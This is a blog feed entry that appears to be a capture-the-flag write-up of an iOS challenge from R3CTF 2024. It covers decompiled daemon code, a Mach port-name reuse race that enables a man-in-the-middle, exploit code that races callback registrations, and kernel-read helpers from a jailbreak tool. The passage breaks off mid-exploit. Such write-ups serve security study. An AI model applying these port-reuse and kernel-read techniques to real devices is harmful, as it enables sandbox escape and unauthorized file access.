<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title></title>
  
  <subtitle>Mainly shit post</subtitle>
  <link href="https://kpwnz.github.io/atom.xml" rel="self"/>
  
  <link href="https://kpwnz.github.io/"/>
  <updated>2024-07-04T19:05:03.065Z</updated>
  <id>https://kpwnz.github.io/</id>
  
  <author>
    <name>Xia0o0o0o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pwn0win: iOS pwning challenges in R3CTF</title>
    <link href="https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/"/>
    <id>https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/</id>
    <published>2024-07-04T17:46:23.000Z</published>
    <updated>2024-07-04T19:05:03.065Z</updated>
    
    <content type="html"><![CDATA[<p>I authored two iOS pwning challenges in R3CTF 2024 a few weeks ago. This post is a write-up for the challenges.</p><h2 id="pwn0win-Forbidden-Content">pwn0win - Forbidden Content</h2><p>This challenge requires you to read a file that is outside of application’s sandbox and not accessible by <code>mobile</code> user. The challenge was running on an iPhone 8 with iOS 16.7.1.</p><p>Players are given two executable files <code>fileviewerd</code> and <code>securityd</code>. And some <code>.defs</code> files related to the IPC interfaces of these two processes. The <code>fileviewerd</code> is a daemon that provides file viewing service to other applications. The <code>securityd</code> is a daemon that provides security verification service to <code>fileviewerd</code>.</p><p>In <code>fileviewerd</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uintptr_t</span> handle; <span class="comment">// ST10_8</span></span><br><span class="line">  __int64 v4; <span class="comment">// x0</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dispatch_queue_s</span> *<span class="title">v5</span>;</span> <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">dispatch_source_t</span> v6; <span class="comment">// ST28_8</span></span><br><span class="line">  <span class="keyword">void</span> *v8; <span class="comment">// [xsp+30h] [xbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [xsp+38h] [xbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [xsp+3Ch] [xbp-44h]</span></span><br><span class="line">  __int64 (__fastcall *v11)(); <span class="comment">// [xsp+40h] [xbp-40h]</span></span><br><span class="line">  <span class="keyword">void</span> *v12; <span class="comment">// [xsp+48h] [xbp-38h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [xsp+50h] [xbp-30h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [xsp+58h] [xbp-28h]</span></span><br><span class="line">  <span class="keyword">dispatch_source_t</span> v15; <span class="comment">// [xsp+60h] [xbp-20h]</span></span><br><span class="line">  <span class="keyword">dispatch_queue_t</span> v16; <span class="comment">// [xsp+68h] [xbp-18h]</span></span><br><span class="line">  <span class="keyword">kern_return_t</span> v17; <span class="comment">// [xsp+74h] [xbp-Ch]</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> sp; <span class="comment">// [xsp+78h] [xbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [xsp+7Ch] [xbp-4h]</span></span><br><span class="line">  <span class="keyword">dispatch_object_t</span> v20; <span class="comment">// 0:x0.8</span></span><br><span class="line"></span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v17 = bootstrap_check_in(*(_DWORD *)bootstrap_port_ptr, <span class="string">&quot;com.xia0o0o0o.fileviewerd&quot;</span>, &amp;sp);</span><br><span class="line">  <span class="keyword">if</span> ( v17 )</span><br><span class="line">  &#123;</span><br><span class="line">    NSLog(&amp;stru_1000084C8);</span><br><span class="line">    v19 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    NSLog(&amp;stru_1000084E8);</span><br><span class="line">    v17 = bootstrap_look_up(*(_DWORD *)bootstrap_port_ptr, <span class="string">&quot;com.xia0o0o0o.securityd&quot;</span>, (<span class="keyword">mach_port_t</span> *)&amp;securityd_port);</span><br><span class="line">    <span class="keyword">if</span> ( !v17 )</span><br><span class="line">    &#123;</span><br><span class="line">      NSLog(&amp;stru_100008528);</span><br><span class="line">      v16 = dispatch_queue_create(<span class="string">&quot;queue&quot;</span>, (<span class="keyword">dispatch_queue_attr_t</span>)_dispatch_queue_attr_concurrent_ptr);</span><br><span class="line">      handle = sp;</span><br><span class="line">      v4 = objc_retainAutoreleaseReturnValue(_dispatch_main_q_ptr);</span><br><span class="line">      v5 = (struct dispatch_queue_s *)objc_retainAutoreleasedReturnValue(v4);</span><br><span class="line">      v15 = dispatch_source_create((<span class="keyword">dispatch_source_type_t</span>)_dispatch_source_type_mach_recv_ptr, handle, <span class="number">0LL</span>, v5);</span><br><span class="line">      objc_release(v5);</span><br><span class="line">      v6 = v15;</span><br><span class="line">      v8 = _NSConcreteStackBlock_ptr;</span><br><span class="line">      v9 = <span class="number">-1040187392</span>;</span><br><span class="line">      v10 = <span class="number">0</span>;</span><br><span class="line">      v11 = __main_block_invoke;</span><br><span class="line">      v12 = &amp;__block_descriptor_48_e8_32s40s_e5_v8__0l;</span><br><span class="line">      v13 = objc_retain(v16);</span><br><span class="line">      v14 = objc_retain(v15);</span><br><span class="line">      dispatch_source_set_event_handler(v6, &amp;v8);</span><br><span class="line">      v20._do = v15;</span><br><span class="line">      dispatch_resume(v20);</span><br><span class="line">      dispatch_main();</span><br><span class="line">    &#125;</span><br><span class="line">    NSLog(&amp;stru_100008508);</span><br><span class="line">    v19 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v19;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It will register a service with <code>com.xia0o0o0o.fileviewerd</code> and look up service with <code>com.xia0o0o0o.securityd</code>.</p><p>We can see the event source is basically</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dispatch_source_t</span> source = dispatch_source_create(</span><br><span class="line">    DISPATCH_SOURCE_TYPE_MACH_RECV, port, <span class="number">0</span>, dispatch_get_main_queue());</span><br></pre></td></tr></table></figure><p>and the event handler is wrapped in a <code>dispatch_async</code> block.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall __main_block_invoke(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [xsp+18h] [xbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [xsp+20h] [xbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [xsp+24h] [xbp-2Ch]</span></span><br><span class="line">  __int64 (__fastcall *v6)(); <span class="comment">// [xsp+28h] [xbp-28h]</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// [xsp+30h] [xbp-20h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [xsp+38h] [xbp-18h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [xsp+40h] [xbp-10h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [xsp+48h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = a1;</span><br><span class="line">  v9 = a1;</span><br><span class="line">  v1 = *(_QWORD *)(a1 + <span class="number">32</span>);</span><br><span class="line">  v3 = _NSConcreteStackBlock_ptr;</span><br><span class="line">  v4 = <span class="number">-1040187392</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = __main_block_invoke_2;</span><br><span class="line">  v7 = &amp;__block_descriptor_40_e8_32s_e5_v8__0l;</span><br><span class="line">  v8 = objc_retain(*(_QWORD *)(a1 + <span class="number">40</span>));</span><br><span class="line">  dispatch_async(v1, &amp;v3);</span><br><span class="line">  <span class="keyword">return</span> objc_storeStrong(&amp;v8, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>fileviewerd</code> can register a callback port</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">SERVER_register_callback</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [xsp+28h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( global_callback_port )</span><br><span class="line">  &#123;</span><br><span class="line">    mach_port_deallocate(*(_DWORD *)mach_task_self__ptr, global_callback_port);</span><br><span class="line">    NSLog(&amp;stru_100008288);</span><br><span class="line">    NSLog(&amp;stru_1000082A8);</span><br><span class="line">  &#125;</span><br><span class="line">  NSLog(&amp;stru_1000082A8);</span><br><span class="line">  NSLog(&amp;stru_1000082C8);</span><br><span class="line">  NSLog(&amp;stru_1000082E8);</span><br><span class="line">  global_callback_port = v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>and when calling <code>read_file()</code> or <code>move_file()</code> it will first verify the user of the request and the actual file owner by communicating with <code>securityd</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">SERVER_read_file</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *a2, __int128 *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int128 *v3; <span class="comment">// ST40_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v4; <span class="comment">// vf</span></span><br><span class="line">  FILE *v6; <span class="comment">// [xsp+58h] [xbp-488h]</span></span><br><span class="line">  __int128 v7; <span class="comment">// [xsp+60h] [xbp-480h]</span></span><br><span class="line">  __int128 v8; <span class="comment">// [xsp+70h] [xbp-470h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// [xsp+8Ch] [xbp-454h]</span></span><br><span class="line">  __int128 v10; <span class="comment">// [xsp+90h] [xbp-450h]</span></span><br><span class="line">  __int128 v11; <span class="comment">// [xsp+A0h] [xbp-440h]</span></span><br><span class="line">  <span class="keyword">mach_error_t</span> error_value; <span class="comment">// [xsp+B4h] [xbp-42Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v13; <span class="comment">// [xsp+B8h] [xbp-428h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [xsp+C0h] [xbp-420h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// [xsp+C4h] [xbp-41Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [xsp+C8h] [xbp-418h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [xsp+4C8h] [xbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v17 = *(_QWORD *)__stack_chk_guard_ptr;</span><br><span class="line">  v14 = a1;</span><br><span class="line">  v13 = a2;</span><br><span class="line">  error_value = <span class="number">0</span>;</span><br><span class="line">  v10 = *a3;</span><br><span class="line">  v11 = a3[<span class="number">1</span>];</span><br><span class="line">  audit_token_to_pid(&amp;v10);</span><br><span class="line">  NSLog(&amp;stru_100008328);</span><br><span class="line">  v7 = *v3;</span><br><span class="line">  v8 = v3[<span class="number">1</span>];</span><br><span class="line">  v9 = audit_token_to_euid(&amp;v7);</span><br><span class="line">  NSLog(&amp;stru_100008348);</span><br><span class="line">  error_value = CLIENT_check_perm((<span class="keyword">unsigned</span> <span class="keyword">int</span>)securityd_port, v9, v13);   <span class="comment">// check permission, </span></span><br><span class="line">                                                                            <span class="comment">// send mach msg to </span></span><br><span class="line">                                                                            <span class="comment">// securityd</span></span><br><span class="line">  <span class="keyword">if</span> ( error_value )</span><br><span class="line">  &#123;</span><br><span class="line">    NSLog(&amp;stru_100008368);</span><br><span class="line">    __strcpy_chk(&amp;v16, <span class="string">&quot;Permission denied\n&quot;</span>, <span class="number">1024LL</span>);</span><br><span class="line">    v15 = error_value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = fopen(v13, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      bzero(&amp;v16, <span class="number">0x400</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( fread(&amp;v16, <span class="number">1uLL</span>, <span class="number">0x400</span>uLL, v6) )</span><br><span class="line">      &#123;</span><br><span class="line">        fclose(v6);</span><br><span class="line">        NSLog(&amp;stru_1000083C8);</span><br><span class="line">        <span class="keyword">if</span> ( global_callback_port</span><br><span class="line">          &amp;&amp; (NSLog(&amp;stru_1000083E8),</span><br><span class="line">              (error_value = fileviewer_listener_callback((<span class="keyword">unsigned</span> <span class="keyword">int</span>)global_callback_port, &amp;v16)) != <span class="number">0</span>) )    <span class="comment">// send mach msg to callback port</span></span><br><span class="line">        &#123;</span><br><span class="line">          NSLog(&amp;stru_100008408);</span><br><span class="line">          mach_error_string(error_value);</span><br><span class="line">          NSLog(&amp;stru_100008428);</span><br><span class="line">          v15 = error_value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v15 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        NSLog(&amp;stru_1000083A8);</span><br><span class="line">        fclose(v6);</span><br><span class="line">        v15 = <span class="number">5</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      NSLog(&amp;stru_100008388);</span><br><span class="line">      v15 = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = __OFSUB__(*(_QWORD *)__stack_chk_guard_ptr, v17);</span><br><span class="line">  <span class="keyword">return</span> v15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>move_file()</code> function will also update the permission of the file.</p><p>The result will be send back to the callback port. <code>securityd</code> is a simple daemon that verifies the user of the request and the actual file owner.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">SERVER_check_perm</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">const</span> <span class="keyword">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">v4</span>;</span> <span class="comment">// [xsp+18h] [xbp-A8h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [xsp+A8h] [xbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [xsp+B4h] [xbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [xsp+B8h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  v5 = a3;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;%s: check permission for uid=%d path=%s\n&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kern_return_t SERVER_check_perm(mach_port_t, uint32_t, const char *)&quot;</span>,</span><br><span class="line">    a2,</span><br><span class="line">    a3);</span><br><span class="line">  <span class="keyword">if</span> ( stat(v5, &amp;v4) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  <span class="keyword">if</span> ( v4.st_uid != v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;owner: %d\n&quot;</span>, v4.st_uid);</span><br><span class="line">LABEL_5:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Permission denied\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Vulnerability">Vulnerability</h2><p>The event handling is wrapped in a <code>dispatch_async</code> block which means the event processing can be raced. The problem now becomes what should we race for?</p><p>In XNU, the <code>mach_port_name_t</code> is a 32-bit integer used as an index in the <code>task</code>’s <code>is_table</code> to find the real port in kernel space.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get the address of ipc_port in Def1nit3lyN0tAJa1lbr3akTool</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">ipc_entry_lookup</span><span class="params">(<span class="keyword">mach_port_t</span> port_name)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kfd</span> *<span class="title">kfd</span> =</span> (struct kfd *)__kfd;</span><br><span class="line">    <span class="keyword">uint64_t</span> task = kfd-&gt;info.kernel.current_task;</span><br><span class="line">    <span class="keyword">uint64_t</span> itk_space = kread64(task + off_task_itk_space);</span><br><span class="line">    <span class="keyword">uint32_t</span> port_index = MACH_PORT_INDEX(port_name);</span><br><span class="line">    <span class="keyword">uint64_t</span> is_table = kread64(itk_space + off_ipc_space_is_table);</span><br><span class="line">    is_table = kernel_pointer_decode(is_table);</span><br><span class="line">    <span class="keyword">uint64_t</span> entry = is_table + port_index * <span class="number">0x18</span>;</span><br><span class="line">    <span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">port_name_to_ipc_port</span><span class="params">(<span class="keyword">mach_port_t</span> port_name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> entry = ipc_entry_lookup(port_name);</span><br><span class="line">    <span class="keyword">uint64_t</span> ipc_port = kread64(entry + <span class="number">0x0</span>);</span><br><span class="line">    <span class="keyword">return</span> ipc_port;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">port_name_to_ipc_port_for_pid</span><span class="params">(<span class="keyword">mach_port_t</span> name, <span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> entry = ipc_entry_lookup_for_pid(name, pid);</span><br><span class="line">    <span class="keyword">return</span> kread64(entry);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>This 32-bit integer can be reused after deallocation. Notice that our application can also get a send right to <code>securityd</code>, what if we can deallocate the <code>securityd</code> in <code>fileviewerd</code> and reuse the port name?</p><p>In our own process, we can look up for a send right to <code>securityd</code> and set it as the callback port in <code>fileviewerd</code>. When registering the callback port, <code>fileviewerd</code> will deallocate the old callback port if it exists.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( global_callback_port )</span><br><span class="line">&#123;</span><br><span class="line">  mach_port_deallocate(*(_DWORD *)mach_task_self__ptr, global_callback_port);</span><br><span class="line">  NSLog(&amp;stru_100008288);</span><br><span class="line">  NSLog(&amp;stru_1000082A8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So if we call this twice, the <code>securityd</code> port will be deallocated. But <code>fileviewerd</code> still uses the old port name to send messages to <code>securityd</code>. If we keep registering callback port we can probably reuse the port name and all messages sent to <code>securityd</code> will be sent to our callback port. This enables an MITM attack.</p><h2 id="Exploit">Exploit</h2><p>First we can look up for the <code>securityd</code> port and set it as the callback port.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Lookup the receiver port using the bootstrap server.</span></span><br><span class="line"><span class="keyword">kern_return_t</span> kr = bootstrap_look_up(bootstrap_port, <span class="string">&quot;com.xia0o0o0o.fileviewerd&quot;</span>, &amp;port);</span><br><span class="line"><span class="keyword">int</span> mypid = getpid();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;My pid is %d\n&quot;</span>, mypid);</span><br><span class="line"><span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bootstrap_look_up() failed with code 0x%x\n&quot;</span>, kr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Port right name %d\n&quot;</span>, port);</span><br><span class="line"></span><br><span class="line">kr = bootstrap_look_up(bootstrap_port, <span class="string">&quot;com.xia0o0o0o.securityd&quot;</span>, &amp;securityd_port);</span><br><span class="line"><span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bootstrap_look_up() failed with code 0x%x\n&quot;</span>, kr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">kr = CLIENT_register_callback(port, securityd_port);</span><br><span class="line"><span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CLIENT_register_callback() failed with code 0x%x\n&quot;</span>, kr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Then we can try to decrease the reference count of the port by</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">race_condition</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!trigger) &#123; &#125;</span><br><span class="line">    CLIENT_register_callback(port, dummy);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dec_ref</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// create 2 threads to call race_condition()</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thread1, thread2;</span><br><span class="line">    pthread_create(&amp;thread1, <span class="literal">NULL</span>, race_condition, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;thread2, <span class="literal">NULL</span>, race_condition, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// trigger</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    trigger = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// wait for the threads to finish</span></span><br><span class="line">    pthread_join(thread1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(thread2, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If everything goes well, the <code>securityd</code> port will be deallocated and we can 